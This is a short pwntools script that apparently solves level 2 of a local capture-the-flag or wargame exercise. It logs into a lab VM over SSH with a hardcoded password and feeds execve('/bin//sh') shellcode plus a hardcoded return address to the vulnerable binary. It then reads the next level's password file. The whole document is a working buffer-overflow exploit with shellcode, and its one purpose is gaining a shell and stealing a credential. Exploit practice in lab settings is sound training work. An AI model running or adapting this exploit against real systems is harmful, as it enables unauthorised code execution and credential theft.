from pwn import *

# Change host according to your configuration
s = ssh(
    user="level2",
    host="192.168.56.101",
    password="53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77",
    port=4242
)

# Check level1 - Second Solution to check th Shellcode
shellcode = (
    b'\x31\xc0\x31\xc9\x31\xd2\xb0\x0b'
    b'\x52\xbb\x2f\x2f\x73\x68\x53\xbb'
    b'\x2f\x62\x69\x6e\x53\x89\xe3\xcd'
    b'\x80'
)

p = s.process("/home/user/level2/level2")
p.sendline(shellcode + p32(0x0804a008).rjust(59))
p.sendline(b'cat /home/user/level3/.pass')

#p.interactive()
p.stream()

p.close()
s.close()
